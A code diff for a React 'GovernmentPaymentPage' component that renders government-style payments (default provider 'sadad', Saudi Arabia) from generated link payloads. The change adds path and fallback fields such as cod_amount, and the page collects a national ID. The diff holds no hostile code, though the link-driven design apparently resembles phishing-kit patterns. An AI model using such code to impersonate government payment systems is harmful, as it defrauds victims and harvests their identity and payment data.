@@ -24,7 +24,7 @@ import {
 } from "lucide-react";
 
 const GovernmentPaymentPage = () => {
-  const { id } = useParams();
+  const { id, provider: pathProvider } = useParams();
   const [searchParams] = useSearchParams();
   const navigate = useNavigate();
   const { data: linkData, isLoading } = useLink(id);
@@ -35,13 +35,15 @@ const GovernmentPaymentPage = () => {
   const [nationalId, setNationalId] = useState("");
   const [isSubmitting, setIsSubmitting] = useState(false);
 
-  const provider = searchParams.get('provider') || linkData?.payload?.provider || 'sadad';
-  const countryCode = searchParams.get('country') || linkData?.payload?.selectedCountry || 'SA';
+  // Get provider from path, query params, or linkData
+  const provider = pathProvider || searchParams.get('provider') || linkData?.payload?.provider || linkData?.payload?.service_key || 'sadad';
+  const countryCode = searchParams.get('country') || linkData?.payload?.selectedCountry || linkData?.country_code || 'SA';
   const countryData = getCountryByCode(countryCode);
   const govSystem = getGovernmentPaymentSystem(countryCode);
 
-  const amount = linkData?.payload?.payment_amount || 500;
-  const reference = linkData?.payload?.reference || '';
+  // Get payment data from linkData
+  const amount = linkData?.payload?.payment_amount || linkData?.payload?.cod_amount || 500;
+  const reference = linkData?.payload?.reference || linkData?.payload?.referenceNumber || '';
   const description = linkData?.payload?.description || '';
   const currencyCode = linkData?.payload?.currency_code || countryData?.currency || 'SAR';
   const formattedAmount = formatCurrency(amount, currencyCode);
